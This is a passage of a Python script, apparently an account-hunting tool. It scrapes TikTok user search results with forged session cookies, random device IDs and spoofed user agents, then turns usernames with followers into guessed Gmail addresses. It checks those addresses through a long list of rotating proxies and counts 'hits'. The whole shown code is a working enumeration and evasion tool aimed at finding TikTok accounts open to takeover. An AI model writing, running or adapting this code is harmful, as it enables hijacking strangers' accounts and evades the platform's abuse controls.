'67.43.228.250:14827', '3.139.242.184:80', '72.10.160.92:27993', '116.125.141.115:80', '54.152.3.36:80', '51.254.78.223:80', '99.80.11.54:3128', '186.96.72.96:999', '13.37.59.99:3128', '35.180.188.216:80', '204.236.176.61:3128', '3.90.100.12:80', '8.220.141.8:3128', '3.123.150.192:80', '54.67.125.45:3128', '3.122.84.99:3128', '23.82.137.157:80', '23.82.137.159:80', '52.67.10.183:80', '67.43.228.250:14827', '146.190.178.108:80', '3.139.242.184:80', '72.10.160.92:27993', '44.195.247.145:80', '54.179.39.14:3128', '47.56.110.204:8990', '44.219.175.186:80', '15.236.106.236:3128', '45.144.64.153:8080', '54.37.214.253:8080', '122.10.225.55:8000', '13.37.59.99:3128', '63.32.1.88:3128', '54.228.164.102:3128', '204.236.176.61:3128', '67.43.228.250:19521', '47.252.50.153:3128', '8.212.168.170:100', '52.63.129.110:3128', '3.124.133.93:3128', '52.67.10.183:80', '67.43.228.250:14827', '152.230.215.123:80', '54.179.39.14:3128', '13.213.114.238:3128', '13.246.209.48:1080', '45.140.143.77:18080', '52.67.10.183:80', '67.43.228.250:14827', '184.169.154.119:80', '47.251.87.199:3128', '175.139.233.79:80', '159.65.230.46:8888', '23.82.137.157:80', '52.67.10.183:80', '200.174.198.86:8888', '67.43.228.250:14827', '3.139.242.184:80', '47.56.110.204:8990', '62.210.15.199:80', '35.72.118.126:80', '51.16.199.206:3128']
      pox=random.choice(wsz)
      proxies = {
    "http": f'http://{pox}'

}
      response = session.post(url, params=params, data=payload, headers=headers,proxies=proxies).text
#      print(response)



      if '1023' in response:
      	self.ch1(email)

      	self.t+=1

      	sys.stdout.write(f'''\rHit: {self.hit} Bad TikTok: {self.f} Bad gmail: {self.tf}\r''')	
      else:
      	self.f+=1
#حبج قردوسه
      	sys.stdout.write(f'''\rHit: {self.hit} Bad TikTok: {self.f} Bad gmail: {self.tf}\r''')


    def ser(self):
	    while True:
	    	k=random.choice([         'azertyuiopmlkjhgfdsqwxcvbn', 
                'azertyuiopmlkjhgfdsqwxcvbn',
                'azertyuiopmlkjhgfdsqwxcvbn',
                'azertyuiopmlkjhgfdsqwxcvbn',
                'azertyuiopmlkjhgfdsqwxcvbn',
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',  
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
                'abcdefghijklmnopqrstuvwxyzñ',  
                'abcdefghijklmnopqrstuvwxyzñ',
                'abcdefghijklmnopqrstuvwxyzñ',
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',  
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',  
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',
                'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',  
                'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',
                'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん', 
                'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん',
                'אبגדהוזحטיכלמנסעפצקרשת',
                'אבגדהוזחטיכלמנסעפצקרשת',
                'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',
                'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',
                'αβγδεζηθικλμνξοπρστυφχψω',  
                'αβγδεζηθικλμνξοπρστυφχψω',
                'abcdefghijklmnopqrstuvwxyzç', 
                'abcdefghijklmnopqrstuvwxyzç',
                'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',  
                'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',
                'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभمयरلवशषसहक्षत्रज्ञ',  
                'अआइईउऊऋएऐओऔअंअःकخगघङचछजझञटठडढणतथदधनپफबभमयरلवशषसहक्षत्रज्ञ',
                
                 'azertyuiopmlkjhgfdsqwxcvbn', 
                'azertyuiopmlkjhgfdsqwxcvbn',
                'azertyuiopmlkjhgfdsqwxcvbn',
                'azertyuiopmlkjhgfdsqwxcvbn',
                'azertyuiopmlkjhgfdsqwxcvbn',
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',  
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
                'abcdefghijklmnopqrstuvwxyzñ',  
                'abcdefghijklmnopqrstuvwxyzñ',
                'abcdefghijklmnopqrstuvwxyzñ',
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',  
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',  
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',
                'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',  
                'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',
                'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん', 
                'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん',
                'אבגדהוזחטיכלמנסעפצקרשת',
                'אבגדהוזחטיכלמנסעפצקרשת',
                'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',
                'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',
                'αβγδεζηθικλμνξοπρστυφχψω',  
                'αβγδεζηθικλμνξοπρστυφχψω',
                'abcdefghijklmnopqrstuvwxyzç', 
                'abcdefghijklmnopqrstuvwxyzç',
                'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',  
                'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',
                'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',  
                'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ'
                
               ])


	    	

	    	try:

	            regions = ["AE", "IQ", "US", "FR", "DE"]
	            languages = ["ar", "en", "fr", "de"]
	                                    
	            j = ''.join(random.choice(k) for i in range(random.randrange(4, 9)))
	            i = "".join(random.choice('1234567890') for i in range(19))
	            headers = {"User-Agent": f"com.zhiliaoapp.musically/{j} (Linux; U; Android {random.randrange(7,13)}; ar; RMX3269; Build/{j}; Cronet/TTNetVersion:75b93580 2024-11-28 QuicVersion:ef6c341e 2024-11-14)"}
	
	            t=requests.get('https://www.tiktok.com/',headers=headers).cookies.get_dict()
	            tt=t["ttwid"]
	
	            response = requests.get(
	    'https://www.tiktok.com/api/search/user/full/?WebIdLastTime=1736179856&aid=1988&app_language=ar&app_name=tiktok_web&browser_language=ar&browser_name=Mozilla&browser_online=true&browser_platform=Linux%20armv81&browser_version=5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&cursor=10&data_collection_enabled=false&device_id=7456835659580671494&device_platform=web_pc&focus_state=true&from_page=search&history_len=13&is_fullscreen=false&is_page_visible=true&keyword=ammar&odinId=7456835545702286341&os=linux&priority_region=&referer=https%3A%2F%2Fwww.tiktok.com%2Flogout%3Fredirect_url%3Dhttps%253A%252F%252Fwww.tiktok.com%252F%2540see.yyy4&region=IQ&root_referer=https%3A%2F%2Fwww.tiktok.com%2F%40see.yyy4&screen_height=800&screen_width=360&search_id=2025021309521452926674120EB71230EC&tz_name=Asia%2FBaghdad&user_is_login=false&verifyFp=verify_m735rlkh_KH1xH0SV_JlNX_4rMV_Bhmm_TeXFdT6MAMCT&web_search_code=%7B%22tiktok%22%3A%7B%22client_params_x%22%3A%7B%22search_engine%22%3A%7B%22ies_mt_user_live_video_card_use_libra%22%3A1%2C%22mt_search_general_user_live_card%22%3A1%7D%7D%2C%22search_server%22%3A%7B%7D%7D%7D&webcast_language=ar&msToken=8qdfDG5yegNQlDbsQQxSjDdv-Lo5OlalRUCxcdjtI9Rrd1DIQLRXTCRinjpPh7bUktfOW4ybWuTL7oYLjZIxWyZ3SLRno2d7UWNxyDJADaH1PC_JQpGxwbNTus0UNKrRZ_T16U4rmKGd-xvSzOZIziTcTg==&X-Bogus=DFSzswVLWuXANjbttkLgYBYRRl7n&_signature=_02B4Z6wo00001QY4DCQAAIDAmCopNUhlpMUGOAiAACYm27'
	)
	            g=response.cookies.get_dict(). get('msToken')
	
	
	            
	            se=str(uuid.uuid4()).replace('-','')
	            cookies = {
	
	    'msToken': str(g),
	
	    'uid_tt': str(se[:16]),
	    'uid_tt_ss': str(se[:16]),
	    'sid_tt': str(se),
	    'sessionid': str(se),
	    'sessionid_ss': str(se),
	
	    'ttwid': tt,
	
	    'msToken':str(g)
	}
	            headers = {
	    'authority': 'www.tiktok.com',
	    'accept': '*/*',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	
	    'referer': 'https://www.tiktok.com/search/user?q=ahmed_faroojsq50&t=1736099390234',
	
	    'user-agent': str(nn()),
	            }
	            params = {
	    'WebIdLastTime': '1731681607',
	    'aid': '1988',
	    'app_language': random.choice(languages),
	    'app_name': 'tiktok_web',
	    'browser_language': 'ar-IQ',
	    'browser_name': 'Mozilla',
	    'browser_online': 'true',
	    'browser_platform': 'Linux armv81',
	    'browser_version': str(nn()),
	    'channel': 'tiktok_web',
	    'cookie_enabled': 'true',
	    'cursor': '70',
	    'data_collection_enabled': 'true',
	    'device_id': str(i),
	    'device_platform': 'web_pc',
	    'focus_state': 'true',
	    'from_page': 'search',
	    'history_len': '6',
	    'is_fullscreen': 'false',
	    'is_page_visible': 'true',
	    'keyword':str(j),
	    'odinId': '7339266198948037633',
	    'os': 'linux',
	    'priority_region': random.choice(regions),
	    'referer': '',
	    'region': random.choice(regions),
	    'screen_height': '800',
	    'screen_width': '360',
	    'search_id': '202501051749510BD3571B3B38F78E0D00',
	    'tz_name': 'Asia/Baghdad',
	    'user_is_login': 'true',
	    'web_search_code': '{"tiktok":{"client_params_x":{"search_engine":{"ies_mt_user_live_video_card_use_libra":1,"mt_search_general_user_live_card":1}},"search_server":{}}}',
	    'webcast_language': 'ar',
	    'msToken': str(g),
	    'X-Bogus': 'DFSzswVL4xhANn49t8VdsFcyeGaP',
	    '_signature': '_02B4Z6wo00001HnwuZwAAIDA9VDlFgbGYTh58L0AAHkO5e',
	}
	            try:
	                r= requests.get('https://www.tiktok.com/api/search/user/full/', params=params, cookies=cookies, headers=headers).json()
	            except:
	                continue
	            for q in r['user_list']:
	
	                fo=(q['user_info']['follower_count'])
	                
	                
	                if fo >= 1:
	                	u=(q['user_info']['unique_id'])
	                	if '..' in u or '_' in u:
	                	  continue
	                	elif len(u)<5 or len(u)>30:
	                	  continue
	                	else:
	                		self.ch2(u+'@gmail.com')

	
	
	
	                
	
	            
	    	except Exception as w:
	    		pass
    def check(self):
    	with open('S1.txt','r') as yu:
    		rei=yu.read().splitlines()
    	for use in rei:
    		if '_' in use or '..' in use:
    			continue
    		elif len(use)<5 or len(use)>30:
    			continue
    		else:
    			email=use+'@gmail.com'
    			self.ch2(use+'@gmail.com')

    def get(self):
        while True:
            k=random.choice([       'azertyuiopmlkjhgfdsqwxcvbn', 
                'azertyuiopmlkjhgfdsqwxcvbn',
                'azertyuiopmlkjhgfdsqwxcvbn',
                'azertyuiopmlkjhgfdsqwxcvbn',
                'azertyuiopmlkjhgfdsqwxcvbn',
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',  
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
                'abcdefghijklmnopqrstuvwxyzñ',  
                'abcdefghijklmnopqrstuvwxyzñ',
                'abcdefghijklmnopqrstuvwxyzñ',
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',  
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',  
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',
                'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',  
                'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',
                'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん', 
                'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん',
                'אבגדהוזחטיכלמנסעפצקרשת',
                'אבגדהوזחטיكلمנסعفصقرشت',
                'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',
                'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',
                'αβγδεζηθικλμνξοπρστυφχψω',  
                'αβγδεζηθικλμνξοπρστυφχψω',
                'abcdefghijklmnopqrstuvwxyzç', 
                'abcdefghijklmnopqrstuvwxyzç',
                'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',  
                'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',
                'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथدधनपفبभमयरلवशषसहक्षत्रज्ञ',  
                'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथدधनپفبभمयरلवशषसहक्षत्रज्ञ',])
      
            try:
    
                # Modified regions list to include only India, Japan, USA, and Pakistan
                regions = ["IN", "JP", "US", "PK"]
                # You might want to adjust languages based on the selected regions
                languages = ["en", "ja", "ur", "hi"] # English, Japanese, Urdu, Hindi
                                        
                j = ''.join(random.choice(k) for i in range(random.randrange(4, 9)))
                i = "".join(random.choice('1234567890') for i in range(19))
                headers = {"User-Agent": f"com.zhiliaoapp.musically/{j} (Linux; U; Android {random.randrange(7,13)}; ar; RMX3269; Build/{j}; Cronet/TTNetVersion:75b93580 2024-11-28 QuicVersion:ef6c341e 2024-11-14)"}
    
                t=requests.get('https://www.tiktok.com/',headers=headers).cookies.get_dict()
                tt=t["ttwid"]
    
                response = requests.get(
        'https://www.tiktok.com/api/search/user/full/?WebIdLastTime=1736179856&aid=1988&app_language=ar&app_name=tiktok_web&browser_language=ar&browser_name=Mozilla&browser_online=true&browser_platform=Linux%20armv81&browser_version=5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&cursor=10&data_collection_enabled=false&device_id=7456835659580671494&device_platform=web_pc&focus_state=true&from_page=search&history_len=13&is_fullscreen=false&is_page_visible=true&keyword=ammar&odinId=7456835545702286341&os=linux&priority_region=&referer=https%3A%2F%2Fwww.tiktok.com%2Flogout%3Fredirect_url%3Dhttps%253A%252F%252Fwww.tiktok.com%252F%2540see.yyy4&region=IQ&root_referer=https%3A%2F%2Fwww.tiktok.com%2F%40see.yyy4&screen_height=800&screen_width=360&search_id=2025021309521452926674120EB71230EC&tz_name=Asia%2FBaghdad&user_is_login=false&verifyFp=verify_m735rlkh_KH1xH0SV_JlNX_4rMV_Bhmm_TeXFdT6MAMCT&web_search_code=%7B%22tiktok%22%3A%7B%22client_params_x%22%3A%7B%22search_engine%22%3A%7B%22ies_mt_user_live_video_card_use_libra%22%3A1%2C%22mt_search_general_user_live_card%22%3A1%7D%7D%2C%22search_server%22%3A%7B%7D%7D%7D&webcast_language=ar&msToken=8qdfDG5yegNQlDbsQQxSjDdv-Lo5OlalRUCxcdjtI9Rrd1DIQLRXTCRinjpPh7bUktfOW4ybWuTL7oYLjZIxWyZ3SLRno2d7UWNxyDJADaH1PC_JQpGxwbNTus0UNKrRZ_T16U4rmKGd-xvSzOZIziTcTg==&X-Bogus=DFSzswVLWuXANjbttkLgYBYRRl7n&_signature=_02B4Z6wo00001QY4DCQAAIDAmCopNUhlpMUGOAiAACYm27'
    )
                g=response.cookies.get_dict(). get('msToken')
    
    
                
                se=str(uuid.uuid4()).replace('-','')
                cookies = {
    
        'msToken': str(g),
    
        'uid_tt': str(se[:16]),
        'uid_tt_ss': str(se[:16]),
        'sid_tt': str(se),
        'sessionid': str(se),
        'sessionid_ss': str(se),
    
        'ttwid': tt,
    
        'msToken':str(g)
    }
                headers = {
        'authority': 'www.tiktok.com',
        'accept': '*/*',
        'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    
        'referer': 'https://www.tiktok.com/search/user?q=ahmed_faroojsq50&t=1736099390234',
    
        'user-agent': str(nn()),
                }
                params = {
        'WebIdLastTime': '1731681607',
        'aid': '1988',
        'app_language': random.choice(languages),
        'app_name': 'tiktok_web',
        'browser_language': 'ar-IQ',
        'browser_name': 'Mozilla',
        'browser_online': 'true',
        'browser_platform': 'Linux armv81',
        'browser_version': str(nn()),
        'channel': 'tiktok_web',
        'cookie_enabled': 'true',
        'cursor': '70',
        'data_collection_enabled': 'true',
        'device_id': str(i),
        'device_platform': 'web_pc',
        'focus_state': 'true',
        'from_page': 'search',
        'history_len': '6',
        'is_fullscreen': 'false',
        'is_page_visible': 'true',
        'keyword':str(j),
        'odinId': '7339266198948037633',
        'os': 'linux',
        'priority_region': random.choice(regions),
        'referer': '',
        'region': random.choice(regions),
        'screen_height': '800',
        'screen_width': '360',
        'search_id': '202501051749510BD3571B3B38F78E0D00',
        'tz_name': 'Asia/Baghdad',
        'user_is_login': 'true',
        'web_search_code': '{"tiktok":{"client_params_x":{"search_engine":{"ies_mt_user_live_video_card_use_libra":1,"mt_search_general_user_live_card":1}},"search_server":{}}}',
        'webcast_language': 'ar',
        'msToken': str(g),
        'X-Bogus': 'DFSzswVL4xhANn49t8VdsFcyeGaP',
        '_signature': '_02B4Z6wo00001HnwuZwAAIDA9VDlFgbGYTh58L0AAHkO5e',
    }
                try:
                    r= requests.get('https://www.tiktok.com/api/search/user/full/', params=params, cookies=cookies, headers=headers).json()
                except:
                    continue
                for q in r['user_list']:
    
                    fo=(q['user_info']['follower_count'])
                    self.num+=1
                    u=(q['user_info']['unique_id'])
                    print(f'{self.num} - User: {u} - Followers : {fo}')
                    if fo >= 100:
                        if '..' in u or '_' in u:
                              continue
                        elif len(u)<5 or len(u)>30:
                              continue
                        else:
                                with open('S1.txt','a') as iu:
                                    iu.write(u+'\n')

    
    
    
                    
    
                
            except Exception as w:
                pass
      	
S1()
